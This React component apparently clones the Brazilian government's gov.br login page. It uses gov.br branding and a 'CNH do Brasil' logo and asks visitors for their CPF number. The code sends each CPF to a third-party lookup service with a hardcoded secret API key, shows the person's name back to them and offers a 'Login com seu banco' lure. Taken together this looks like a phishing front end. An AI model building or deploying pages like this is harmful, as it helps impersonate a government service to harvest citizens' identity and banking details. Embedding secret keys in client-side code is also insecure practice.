import React, { useState } from 'react';
import { Banknote, Moon, Accessibility, UserSquare } from 'lucide-react';

const LoginHeader: React.FC = () => (
  <header className="bg-white border-b border-gray-200">
    <div className="max-w-4xl mx-auto px-4 py-3 flex items-center justify-between">
      <img 
        src="/Gov.br_logo.svg.png" 
        alt="gov.br" 
        className="h-8"
      />
      <div className="flex items-center gap-4 text-blue-700">
        <button className="p-1 hover:bg-gray-100 rounded-full"><Moon size={20} /></button>
        <button className="p-1 hover:bg-gray-100 rounded-full"><Accessibility size={20} /></button>
      </div>
    </div>
  </header>
);

const CnhLogo: React.FC = () => (
    <div className="flex items-center justify-center my-8">
        <div className="inline-block">
            <div className="flex items-end">
                <span className="text-6xl font-extrabold text-[#0033a0]">CNH</span>
                <div className="w-0 h-0
                    border-b-[40px] border-b-transparent
                    border-l-[40px] border-l-yellow-400
                    border-t-[40px] border-t-transparent
                    -ml-2">
                </div>
            </div>
            <div className="bg-[#009739] text-white font-bold text-center text-lg -mt-5 py-0.5 tracking-wider">
                DO BRASIL
            </div>
        </div>
    </div>
);

const LoginPage: React.FC = () => {
  const [cpf, setCpf] = useState('');
  const [isLoading, setIsLoading] = useState(false);

  const handleCpfChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const value = e.target.value;
    const formattedCpf = value
      .replace(/\D/g, '') // Remove todos os caracteres não numéricos
      .replace(/(\d{3})(\d)/, '$1.$2') // Adiciona ponto após o 3º dígito
      .replace(/(\d{3})(\d)/, '$1.$2') // Adiciona ponto após o 6º dígito
      .replace(/(\d{3})(\d{1,2})$/, '$1-$2'); // Adiciona traço antes dos últimos 2 dígitos
    
    // Limita o tamanho ao máximo de um CPF formatado
    setCpf(formattedCpf.substring(0, 14));
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!cpf) {
      alert("Por favor, digite um CPF.");
      return;
    }
    setIsLoading(true);

    const apiKey = 'b77f7a8b39207b2199969684bdad61d2f93113323a6c4d796e9bd8e256c55df6';
    const url = `https://api.cpfhub.io/cpf/${cpf.replace(/\D/g, '')}`;

    try {
      const response = await fetch(url, {
        headers: {
          'x-api-key': apiKey
        }
      });

      const data = await response.json();

      if (response.ok && data.success) {
        alert(`CPF Válido! Nome: ${data.data.name}`);
      } else {
        alert(`Erro ao consultar o CPF: ${data.message || 'CPF inválido ou não encontrado.'}`);
      }
    } catch (error) {
      console.error("Erro na requisição:", error);
      alert("Ocorreu um erro ao tentar validar o CPF. Tente novamente mais tarde.");
    } finally {
      setIsLoading(false);
    }
  };

  return (
    <div className="bg-gray-50 min-h-screen">
      <LoginHeader />
      <main className="max-w-sm mx-auto px-4 py-8">
        <CnhLogo />
        <div className="bg-white p-6 rounded-lg shadow">
          <h1 className="text-xl font-bold text-gray-800 mb-4">Identifique-se no gov.br com:</h1>
          
          <div className="flex items-start gap-3 mb-6">
            <UserSquare size={24} className="text-blue-600 mt-1 shrink-0" />
            <div>
              <p className="font-semibold text-gray-700">Número do CPF</p>
              <p className="text-sm text-gray-600">
                Digite seu CPF para <strong>criar</strong> ou <strong>acessar</strong> sua conta gov.br
              </p>
            </div>
          </div>
          
          <form onSubmit={handleSubmit}>
            <div className="mb-4">
              <label htmlFor="cpf" className="block text-sm font-bold text-gray-700 mb-1">CPF</label>
              <input 
                type="text" 
                id="cpf"
                placeholder="000.000.000-00"
                value={cpf}
                onChange={handleCpfChange}
                className="w-full p-3 border border-gray-400 rounded-lg focus:bg-yellow-100 focus:border-yellow-500 focus:ring-1 focus:ring-yellow-500 focus:outline-none text-lg tracking-wider"
                disabled={isLoading}
                maxLength={14}
              />
            </div>
            <button 
              type="submit"
              className="w-full bg-[#0d6efd] text-white py-3 rounded-full font-bold text-lg hover:bg-blue-700 transition-colors disabled:bg-gray-400"
              disabled={isLoading}
            >
              {isLoading ? 'Verificando...' : 'Continuar'}
            </button>
          </form>

          <div className="mt-8">
            <div className="relative my-6">
              <div className="absolute inset-0 flex items-center">
                <div className="w-full border-t border-gray-300"></div>
              </div>
              <div className="relative flex justify-center text-sm">
                <span className="px-2 bg-white text-gray-500">Outras opções de identificação:</span>
              </div>
            </div>
            <button className="w-full flex items-center justify-between p-3 border border-gray-300 rounded-lg hover:bg-gray-50">
              <div className="flex items-center gap-3">
                <Banknote size={20} className="text-green-600" />
                <span className="font-semibold text-green-700">Login com seu banco</span>
              </div>
              <span className="bg-green-600 text-white text-xs font-bold px-2 py-1 rounded">SUA CONTA SERÁ PRATA</span>
            </button>
          </div>
        </div>
      </main>
    </div>
  );
};

export default LoginPage;